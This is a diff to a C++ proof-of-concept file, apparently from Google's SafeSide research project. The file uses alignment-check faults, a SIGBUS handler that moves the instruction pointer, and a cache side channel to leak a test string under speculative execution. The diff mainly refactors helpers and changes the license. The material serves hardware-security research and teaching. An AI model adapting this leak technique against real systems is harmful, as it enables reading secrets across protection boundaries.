@@ -1,17 +1,10 @@
 /*
  * Copyright 2019 Google LLC
  *
- * Licensed under the Apache License, Version 2.0 (the "License");
- * you may not use this file except in compliance with the License.
- * You may obtain a copy of the License at
+ * Licensed under both the 3-Clause BSD License and the GPLv2, found in the
+ * LICENSE and LICENSE.GPL-2.0 files, respectively, in the root directory.
  *
- *   https://www.apache.org/licenses/LICENSE-2.0
- *
- * Unless required by applicable law or agreed to in writing, software
- * distributed under the License is distributed on an "AS IS" BASIS,
- * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
- * See the License for the specific language governing permissions and
- * limitations under the License.
+ * SPDX-License-Identifier: BSD-3-Clause OR GPL-2.0
  */
 
 /**
@@ -32,7 +25,7 @@
 
 #include "compiler_specifics.h"
 
-#ifndef __linux__
+#if !SAFESIDE_LINUX
 #  error Unsupported OS. Linux required.
 #endif
 
@@ -48,9 +41,9 @@
 
 #include "cache_sidechannel.h"
 #include "instr.h"
-
-const char *public_data = "Hello, world!";
-const char *private_data = "It's a s3kr3t!!!";
+#include "local_content.h"
+#include "meltdown_local_content.h"
+#include "utils.h"
 
 // Storage for the public data.
 // Must be at least a native word size. That's why we pick uintptr_t.
@@ -77,7 +70,7 @@ static void InitializeUnalignedData() {
 
 static char LeakByte(uintptr_t *unaligned_data, size_t offset) {
   CacheSideChannel sidechannel;
-  const std::array<BigByte, 256> &isolated_oracle = sidechannel.GetOracle();
+  const std::array<BigByte, 256> &oracle = sidechannel.GetOracle();
 
   for (int run = 0;; ++run) {
     size_t safe_offset = run % strlen(public_data);
@@ -85,13 +78,13 @@ static char LeakByte(uintptr_t *unaligned_data, size_t offset) {
 
     // Successful execution accesses safe_offset and loads ForceRead code into
     // cache.
-    ForceRead(isolated_oracle.data() + unaligned_data[safe_offset]);
+    ForceRead(oracle.data() + unaligned_data[safe_offset]);
 
     EnforceAlignment();
     MemoryAndSpeculationBarrier();
 
     // Accesses unaligned data despite of the enforcement. Triggers SIGBUS.
-    ForceRead(isolated_oracle.data() + unaligned_data[offset]);
+    ForceRead(oracle.data() + unaligned_data[offset]);
 
     // Architecturally dead code. Never reached unless AM flag in CR0 is off.
     std::cout << "Dead code. Must not be printed. "
@@ -124,30 +117,9 @@ static char LeakByte(uintptr_t *unaligned_data, size_t offset) {
   }
 }
 
-static void sigbus(
-    int /* signum */, siginfo_t * /* siginfo */, void *context) {
-  // SIGBUS signal handler.
-  // Moves the instruction pointer to the "afterspeculation" label.
-  ucontext_t *ucontext = static_cast<ucontext_t *>(context);
-#if SAFESIDE_X64
-  ucontext->uc_mcontext.gregs[REG_RIP] =
-      reinterpret_cast<greg_t>(afterspeculation);
-#else
-  ucontext->uc_mcontext.gregs[REG_EIP] =
-      reinterpret_cast<greg_t>(afterspeculation);
-#endif
-}
-
-static void SetSignal() {
-  struct sigaction act;
-  act.sa_sigaction = sigbus;
-  act.sa_flags = SA_SIGINFO;
-  sigaction(SIGBUS, &act, NULL);
-}
-
 int main() {
   InitializeUnalignedData();
-  SetSignal();
+  OnSignalMoveRipToAfterspeculation(SIGBUS);
   std::cout << "Leaking the string: ";
   std::cout.flush();
   size_t private_offset = unaligned_private_data - unaligned_public_data;
